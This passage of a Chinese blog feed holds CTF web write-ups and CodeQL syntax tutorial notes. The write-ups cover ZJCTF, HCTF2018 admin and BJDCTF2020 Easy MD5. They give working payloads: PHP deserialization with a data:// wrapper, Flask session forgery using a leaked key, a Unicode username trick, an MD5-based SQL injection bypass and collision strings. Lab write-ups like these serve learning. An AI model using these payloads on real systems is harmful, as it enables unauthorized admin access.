class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br><br></code></pre></td></tr></table></figure><p>看来只要读<code>flag.php</code>就行了；最后是参数<code>password</code>，这里用到了反序列化，序列化内容有三个部分：<code>类型:内容长度:内容</code>，所以这里可以</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">password</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Flag&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>最后使用payload：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;file=useless.php&amp;<span class="hljs-keyword">password</span>=O:<span class="hljs-number">4</span>:&quot;Flag&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:&quot;file&quot;;s:<span class="hljs-number">8</span>:&quot;flag.php&quot;;&#125;<br></code></pre></td></tr></table></figure><p>查看源码得到flag。</p><hr><hr><p><a href="https://cloud.tencent.com/developer/article/1838799">Web安全 | PHP反序列化入门这一篇就够了 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
      <tag>php代码审计</tag>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] HCTF2018-admin</title>
    <link href="/2022/11/30/%5Bctf-web%5D%20HCTF2018-admin/"/>
    <url>/2022/11/30/%5Bctf-web%5D%20HCTF2018-admin/</url>
    
    <content type="html"><![CDATA[<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>进入后是一个界面，有<code>login</code>和<code>register</code>的功能，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221130213819774.png" alt="image-20221130213819774"></p><p>既然题目是admin，那么就需要用admin用户登录，<del>然后使用密码123登录成功得到flag</del>；忘了上一句话，发现登录不了，尝试用弱密码爆破，无法成功，那么就注册用户，这里想到了二次注入，但是好像经过了过滤，无法注册有特殊字符的用户，那就注册正常用户，登录成功，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221130214215635.png" alt="image-20221130214215635"></p><p>这里能post内容，能修改密码，能登出。首先尝试post，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221130214316819.png" alt="image-20221130214316819"></p><p>虽然能发送任意内容，但是也不知道在哪显示；然后尝试修改密码，查看源代码发现网址<code>https://github.com/woadsl1234/hctf_flask/</code>，是个flask的项目，可能就是这道题目的，flask有个session伪造的方法，首先获取当前用户的session，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221130214613510.png" alt="image-20221130214613510"></p><p>在刚才的项目中的<code>config.py</code>中找到密钥<code>ckj123</code>，然后就可以解密session了，脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<br><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decryption</span>(<span class="hljs-params">payload</span>):<br>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br>    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br><br>    decompress = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):<br>        payload = payload[<span class="hljs-number">1</span>:]<br>        decompress = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">try</span>:<br>        payload = base64_decode(payload)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span><br>                         <span class="hljs-string">&#x27;an exception&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> decompress:<br>        <span class="hljs-keyword">try</span>:<br>            payload = zlib.decompress(payload)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span><br>                             <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(decryption(sys.argv[<span class="hljs-number">1</span>].encode()))   <br><br></code></pre></td></tr></table></figure><p>用法：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">python session.py .eJw90M2OglAMBeBXmXTtAhA2Ji5mwk8waQmTKze9G-MoAhfrJKgRML77oMm4Pul32t5hc-jKcw2LS3ctZ7Bp9rC4w8cPLABDdljtAqPRQdXeyLYBSuqSqhuS1DG2qCmMhSwHrIsabTrHhF0e85GlkCwsLCmcT7NBlsS1CddztnvJktTJdO5mOhpIfR0pwZuR1Mdw16OdNLuSyW3IWx1N8m1RR75RPGQae5ZVywp9lOhmdFzztAt60RIeM9idu8Pm8tuWp_cJpJ-1n4PReT8RPo9kJ1LYPoncZ0GPbOpRQi2NVYBjNWC1fHGNbKvyLa1V4f4np61MAfR9DzO4nsvu9TVwHXj8Aa-Aa7k.Y4dbrQ.qA_QBNA01XHpKpdTl_aAX9EDUEw<br></code></pre></td></tr></table></figure><p>得到：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;064a79ec<span class="hljs-number">41906992</span>b558b6b4f5a41f669aea<span class="hljs-number">2270</span>f5c43bef85c<span class="hljs-number">537199</span>8aad57b7f8b49d59a250e4c0fb<span class="hljs-number">807123</span>cb2f41b7beddc1a8e629c1bbda382a0eaaa8b3a&#x27;, &#x27;csrf_token&#x27;: b&#x27;5aad02ed1e68c3cddfb382d8bc<span class="hljs-number">6626</span>4cd<span class="hljs-number">789382</span>2&#x27;, &#x27;image&#x27;: b&#x27;Q5u2&#x27;, &#x27;name&#x27;: &#x27;xxx&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;<br></code></pre></td></tr></table></figure><p>修改其中的<code>name</code>为<code>admin</code>，使用加密脚本，在<a href="https://github.com/noraj/flask-session-cookie-manager">这里</a>，</p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">python flask_session_cookie_manager3.py -s &quot;ckj123&quot; -t &quot;&#123;<span class="hljs-string">&#x27;_fresh&#x27;</span>: True, <span class="hljs-string">&#x27;_id&#x27;</span>: b<span class="hljs-string">&#x27;064a79ec41906992b558b6b4f5a41f669aea2270f5c43bef85c5371998aad57b7f8b49d59a250e4c0fb807123cb2f41b7beddc1a8e629c1bbda382a0eaaa8b3a&#x27;</span>, <span class="hljs-string">&#x27;csrf_token&#x27;</span>: b<span class="hljs-string">&#x27;5aad02ed1e68c3cddfb382d8bc66264cd7893822&#x27;</span>, <span class="hljs-string">&#x27;image&#x27;</span>: b<span class="hljs-string">&#x27;Q5u2&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;user_id&#x27;</span>: <span class="hljs-string">&#x27;10&#x27;</span>&#125;&quot;<br></code></pre></td></tr></table></figure><p>得到新的session，用这个session登录得到flag。</p><hr><hr><p>还有第二个解法，审计代码发现，修改密码时有这样一句：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">name</span> = strlower(session[<span class="hljs-string">&#x27;name&#x27;</span>])<br></code></pre></td></tr></table></figure><p>这里<code>strlower()</code>函数定义为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">def <span class="hljs-title">strlower</span><span class="hljs-params">(username)</span>:</span><br><span class="hljs-function">    username =</span> nodeprep.<span class="hljs-built_in">prepare</span>(username)<br>    <span class="hljs-keyword">return</span> username<br></code></pre></td></tr></table></figure><p>而<code>nodeprep.prepare()</code>函数存在<code>unicode</code>欺骗漏洞，会将<code>unicode</code>字符转换为<code>A</code>然后转换为<code>a</code>，所以可以注册用户<code>ᴬᴰᴹᴵᴺ</code>，然后以这个用户登录，修改密码，就等于修改<code>admin</code>的密码了。</p><p>[Search - Unicode Character Table (unicode-table.com)](<a href="https://unicode-table.com/en/search/?q=small">https://unicode-table.com/en/search/?q=small</a> capital)</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[代码审计] codeql语法-06-查询</title>
    <link href="/2022/11/29/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql%E8%AF%AD%E6%B3%95-06-%E6%9F%A5%E8%AF%A2/"/>
    <url>/2022/11/29/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql%E8%AF%AD%E6%B3%95-06-%E6%9F%A5%E8%AF%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="codeql语法–查询（Querie）"><a href="#codeql语法–查询（Querie）" class="headerlink" title="codeql语法–查询（Querie）"></a>codeql语法–查询（Querie）</h1><p>查询是QL程序的输出。他们评估结果集。有两种查询。对于给定的查询模块，该模块中的查询为：</p><ul><li>在该模块中定义的select⼦句（如果有）。</li><li>该模块的谓词 命名空间中的任何查询谓词。也就是说，它们可以在模块本身中定义，也可以从其他模块导⼊。</li></ul><h2 id="Select⼦句（Select-clauses）"><a href="#Select⼦句（Select-clauses）" class="headerlink" title="Select⼦句（Select clauses）"></a>Select⼦句（Select clauses）</h2><p>编写查询模块时，可以包括以下形式的<code>select</code>⼦句（通常在⽂件末尾）：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">from <span class="hljs-regexp">/* ... variable declarations ... */</span><br>where <span class="hljs-regexp">/* ... logical formula ... */</span><br>select <span class="hljs-regexp">/* ... expressions ... */</span><br></code></pre></td></tr></table></figure><p> <code>from</code> 与 <code>where</code> 部分是可选的</p><p><code>select</code>⼦句中，除了“表达式”中描述的表达式外，<code>select</code>⼦句还可以包括:</p><ul><li><code>as</code>关键字，后⾯可以接搜索结果的别名（类似sql），并允许您在后续的选择表达式中使⽤它们</li><li><code>order by</code> 关键字（类似sql的 <code>order by</code>），随后是结果列的名称，以及任选的关键字或。这确定了显示结果的顺序。</li></ul><p>例如：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">from</span> <span class="hljs-built_in">int</span> x, <span class="hljs-built_in">int</span> y<br><span class="hljs-keyword">where</span> x = <span class="hljs-number">3</span> and y <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span> .. <span class="hljs-number">2</span>]<br><span class="hljs-keyword">select</span> y, y, x*y <span class="hljs-keyword">as</span> product, <span class="hljs-string">&quot;product: &quot;</span> + product<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221129214125723.png" alt="image-20221129214125723"></p><h2 id="查询谓词（Query-predicates）"><a href="#查询谓词（Query-predicates）" class="headerlink" title="查询谓词（Query predicates）"></a>查询谓词（Query predicates）</h2><p>查询谓词是带有 注释的⾮成员谓词 <code>query</code> 。它返回谓词求值的所有元组。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">query <span class="hljs-built_in">int</span> get<span class="hljs-constructor">Product(<span class="hljs-params">int</span> <span class="hljs-params">x</span>, <span class="hljs-params">int</span> <span class="hljs-params">y</span>)</span>&#123;<br>    x = <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <br>    y <span class="hljs-keyword">in</span> <span class="hljs-literal">[<span class="hljs-number">0</span> .. <span class="hljs-number">2</span>]</span> <span class="hljs-keyword">and</span> <br>    result = x<span class="hljs-operator"> * </span>y<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221129214300415.png" alt="image-20221129214300415"></p><p>编写查询谓词⽽不是<code>select</code>⼦句的好处是，也可以在代码的其他部分调⽤谓词。</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>codeql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] BJDCTF2020-EasyMD5</title>
    <link href="/2022/11/29/%5Bctf-web%5D%20BJDCTF2020-EasyMD5/"/>
    <url>/2022/11/29/%5Bctf-web%5D%20BJDCTF2020-EasyMD5/</url>
    
    <content type="html"><![CDATA[<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><blockquote><p><a href="https://www.cnblogs.com/ainsliaea/p/15126218.html">PHP md5 相等绕过 - Ainsliaea - 博客园 (cnblogs.com)</a></p></blockquote><p>首先进入是一个页面，可以提交数据：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221129210657557.png" alt="image-20221129210657557"></p><p>尝试提交后没有发现什么东西，所以用bp抓包，发现了提示，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221129210739917.png" alt="image-20221129210739917"></p><p>可以看到进行了<code>md5</code>处理，在PHP中有关于MD5绕过的方法，用到字符串<code>ffifdyop</code>，这个字符串的MD5结果是：<code>276f722736c95d99e921722cf9ed621c</code> ，如果把这个当场十六进制编码，就是<code>&#39;or&#39;6蒥欓!r,b</code>，将这个字符串作为拼接内容，那么就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">select * <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;admin&#x27;</span> where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;6蒥欓!r,b&#x27;</span><br></code></pre></td></tr></table></figure><p>后面的条件为真，所以可绕过。</p><p>接着跳转到新页面，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221129211432000.png" alt="image-20221129211432000"></p><p>查看源代码可以发现内容，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))<br></code></pre></td></tr></table></figure><p>需要两个参数，满足参数值不同，但MD5相同，有一些字符串可以绕过PHP的MD5的<code>==</code>判断：</p><ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li></ul><p>所以设置参数为上面的任意两个可以绕过。</p><p>接着又跳到新页面，直接有代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这次是<code>===</code>，这次可以使用数组绕过，设置<code>?param1[]=1&amp;param2[]=2</code>即可，因为PHP中<code>md5()</code>函数无法处理数组（会返回NULL）。</p><p>或者可以使用MD5碰撞，可能存在两个不同的字符串，但MD5值相同，</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">$s1 = <span class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br>$s2 = <span class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span><br>$s3 = <span class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
      <tag>md5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[代码审计] codeql语法-05-别名</title>
    <link href="/2022/11/28/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql%E8%AF%AD%E6%B3%95-05-%E5%88%AB%E5%90%8D/"/>
    <url>/2022/11/28/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql%E8%AF%AD%E6%B3%95-05-%E5%88%AB%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="codeql语法–别名（Aliases）"><a href="#codeql语法–别名（Aliases）" class="headerlink" title="codeql语法–别名（Aliases）"></a>codeql语法–别名（Aliases）</h1><p>别名是现有QL实体的替代名称。<br>定义别名后，可以使⽤该新名称来引⽤当前模块名称空间中的实体。</p><h2 id="定义别名（Defining-an-alias）"><a href="#定义别名（Defining-an-alias）" class="headerlink" title="定义别名（Defining an alias）"></a>定义别名（Defining an alias）</h2><p>您可以在任何模块的主体中定义别名。</p><h3 id="模块别名（Module-aliases）"><a href="#模块别名（Module-aliases）" class="headerlink" title="模块别名（Module aliases）"></a>模块别名（Module aliases）</h3><p>使⽤以下语法为模块定义别名：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">module ModAlias <span class="hljs-operator">=</span> ModuleName<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>如果您创建的新模块 <code>NewVersion</code> 是 <code>OldVersion</code> 的更新版本，则可以弃⽤该名称<code>OldVersion</code> ，如下所示：</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon"><span class="hljs-keyword">deprecated</span> <span class="hljs-keyword">module</span> OldVersion = NewVersion<br></code></pre></td></tr></table></figure><p>这样，两个名称都解析为相同的模块，但是如果使⽤名称 <code>OldVersion</code> ，则会显示弃⽤警告。</p><h3 id="类型别名（Type-aliases）"><a href="#类型别名（Type-aliases）" class="headerlink" title="类型别名（Type aliases）"></a>类型别名（Type aliases）</h3><p>使⽤以下语法为类型定义别名：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">class TypeAlias <span class="hljs-operator">=</span> TypeName<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>请注意，这 <code>class</code> 只是⼀个关键字。可以为任何类型（即原始类型， 数据库类型和⽤户定义的类）定义别名。</p><p>比如，可以使⽤别名将基本类型的名称缩写 <code>boolean</code> 为 <code>bool</code> ：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">class</span> <span class="hljs-title class_">bool</span> = <span 